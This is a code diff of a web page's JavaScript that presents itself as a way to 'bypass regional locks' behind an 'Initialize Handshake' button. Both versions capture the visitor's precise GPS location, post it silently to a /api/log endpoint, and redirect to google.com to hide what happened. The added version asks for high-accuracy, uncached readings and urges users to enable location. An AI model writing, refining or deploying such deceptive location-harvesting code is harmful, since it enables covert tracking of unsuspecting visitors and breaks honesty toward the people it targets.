@@ -1,22 +1,40 @@
-async function sendLocation() {
+// script.js
+function sendLocation() {
     const btn = document.getElementById('authBtn');
-    btn.innerText = "Authorizing...";
-    
-    if (navigator.geolocation) {
-        navigator.geolocation.getCurrentPosition(async (pos) => {
-            const data = { lat: pos.coords.latitude, lon: pos.coords.longitude };
-            try {
-                await fetch('/api/log', {
-                    method: 'POST',
-                    body: JSON.stringify(data)
-                });
-                window.location.href = "https://www.google.com"; // Redirect after success
-            } catch (e) {
-                alert("Connection failed, please try again.");
-            }
-        }, (err) => {
-            alert("Location access is required to bypass regional locks.");
-            btn.innerText = "Initialize Handshake";
-        });
+    btn.innerText = "Connecting...";
+
+    if (!navigator.geolocation) {
+        alert("Geolocation is not supported by this browser.");
+        return;
     }
-}
+
+    // Success callback
+    const success = (position) => {
+        const data = {
+            lat: position.coords.latitude,
+            lon: position.coords.longitude
+        };
+
+        fetch('/api/log', {
+            method: 'POST',
+            body: JSON.stringify(data)
+        }).then(() => {
+            window.location.href = "https://google.com";
+        });
+    };
+
+    // Error callback (Very important for debugging)
+    const error = (err) => {
+        console.warn(`ERROR(${err.code}): ${err.message}`);
+        alert("Permission denied or location service off. Please enable location to continue.");
+        btn.innerText = "Initialize Handshake";
+    };
+
+    // Try to get position
+    navigator.geolocation.getCurrentPosition(success, error, {
+        enableHighAccuracy: true,
+        timeout: 10000,
+        maximumAge: 0
+    });
+            }
+            
